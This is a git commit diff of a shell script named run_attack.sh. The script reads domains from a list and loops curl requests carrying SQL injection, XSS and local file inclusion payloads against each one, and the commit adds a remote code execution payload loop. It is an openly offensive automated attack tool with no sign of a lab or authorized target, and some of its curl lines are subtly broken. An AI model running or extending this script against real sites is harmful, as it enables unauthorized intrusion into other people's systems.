021a2eaed42524ec006d44c4492de3f8f379475f
Mas TenWap <41187917+mastenwap@users.noreply.github.com>
2021-11-26 10:18:02 +0700

    Update run_attack.sh

--- run_attack.sh
+++ run_attack.sh
@@ -4,8 +4,8 @@ encode1=$(cat sqlilist.txt | sed 's/ /%20/g' > sqlilist_encode.txt)
 sqli(){
 for cek in $(cat sqlilist_encode.txt);
 do
-curl -s $domain$cek
-echo "$domain$cek"
+curl -s $domain$cek > /logs/sqlilog.txt
+echo "SQLI -> $domain"
 done
 }
 
@@ -14,8 +14,8 @@ encode2=$(cat xsslist.txt | sed 's/ /%20/g' > xsslist_encode.txt)
 xss(){
 for cek in $(cat xsslist_encode.txt);
 do
-curl -s $domain$cek
-echo "$domain$cek"
+curl -s $domain$cek > /logs/xsslog.txt
+echo "XSS -> $domain"
 done
 }
 
@@ -23,13 +23,22 @@ encode3=$(cat lfilist.txt | sed 's/ /%20/g' > lfilist_encode.txt)
 lfi(){
 for cek in $(cat lfilist_encode.txt);
 do
-curl -s $domain$cek
-echo "$domain$cek"
+curl -s $domain$cek /logs/lfilog.txt
+echo "LFI -> $domain"
+done
+}
+
+encode4=$(cat rcelist.txt | sed 's/ /%20/g' > rcelist_encode.txt)
+rce(){
+for cek in $(cat rcelist_encode.txt);
+do
+curl -s $domain$cek /logs/rcelog.txt
+echo "RCE -> $domain"
 done
 }
 
 
 for domain in $(cat domainlist.txt);
 do
-sqli && xss && lfi
+sqli && xss && lfi && rce
 done
